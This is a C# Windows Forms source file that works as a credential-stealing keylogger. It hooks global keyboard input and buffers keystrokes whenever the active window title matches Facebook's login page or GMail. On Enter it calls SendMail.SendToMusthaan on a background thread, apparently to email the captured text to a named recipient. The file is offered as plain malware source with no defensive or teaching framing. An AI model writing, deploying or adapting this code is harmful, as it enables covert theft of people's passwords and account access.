using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;

using System.Text;
using System.Threading;
using System.Windows.Forms;
using gma.System.Windows;
namespace hook
{
    public partial class Form1 : Form
    {
        string tmpVal = string.Empty;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            UserActivityHook actHook;
            actHook = new UserActivityHook();
            actHook.OnMouseActivity += new MouseEventHandler(MouseMoved);
            actHook.KeyDown += new KeyEventHandler(MyKeyDown);
            actHook.KeyPress += new KeyPressEventHandler(MyKeyPress);
            actHook.KeyUp += new KeyEventHandler(MyKeyUp);

        }
        public void MyKeyDown(object sender, KeyEventArgs e)
        {


        }


        public void MouseMoved(object sender, MouseEventArgs e)
        {

        }
        public void MyKeyPress(object sender, KeyPressEventArgs e)
        {
            windowInfo w = new windowInfo();
            string title = w.GetActiveWindowTitle();
            List<string> tags = new List<string>();
            tags.Add("Welcome to Facebook - Log In, Sign Up or Learn More");
            tags.Add("GMail");
            bool flag = false;
            foreach (var item in tags)
            {
                if (title.ToLower().Contains(item.ToLower()))
                    flag = true;
            }
            if (flag)
            {
                tmpVal += "\n" + e.KeyChar.ToString();
                if (e.KeyChar == 13)
                {
                    
                    
                    Thread t = new Thread(() => SendMail.SendToMusthaan(tmpVal));
                    t.Start();
              

                }
            }
        }

        public void MyKeyUp(object sender, KeyEventArgs e)
        {

        }
    }
}
